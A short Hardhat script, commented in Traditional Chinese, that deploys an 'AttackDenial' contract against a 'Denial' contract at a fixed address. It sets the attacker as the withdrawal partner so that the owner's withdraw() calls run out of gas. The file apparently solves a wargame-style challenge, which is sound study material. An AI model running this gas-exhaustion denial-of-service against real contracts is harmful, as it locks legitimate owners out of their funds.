import hre from "hardhat";
const { ethers } = hre;

// 使用 hardhat 運行時函數，避免導入問題
async function main() {

    console.log("開始執行 Denial 合約攻擊腳本...");

    // 目標合約的地址
    const targetAddress = "0xBBa23DbF343d46966D990dc7245577D3681ba12B";
    console.log(`目標 Denial 合約地址: ${targetAddress}`);

    // 獲取部署者賬戶
    // @ts-ignore
    const [deployer] = await ethers.getSigners();
    console.log(`使用賬戶: ${deployer.address}`);

    // 部署攻擊合約
    console.log("正在部署攻擊合約...");
    // @ts-ignore
    const attackFactory = await ethers.getContractFactory("AttackDenial");
    const attackContract = await attackFactory.deploy(targetAddress);
    await attackContract.waitForDeployment();

    const attackAddress = await attackContract.getAddress();
    console.log(`攻擊合約已部署到地址: ${attackAddress}`);

    // 執行攻擊，將攻擊合約設置為 partner
    console.log("正在執行攻擊...");
    const tx = await attackContract.attack();
    await tx.wait();
    console.log("攻擊已完成！");

    // 驗證攻擊成功的信息
    console.log("攻擊合約已被設置為 Denial 合約的 partner");
    console.log("當 owner 嘗試調用 withdraw() 時，所有 gas 將被消耗完畢");
    console.log("這將導致交易失敗，owner 無法提取資金");
    console.log("攻擊成功！");
}

// 運行主函數並捕獲任何錯誤
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
}); 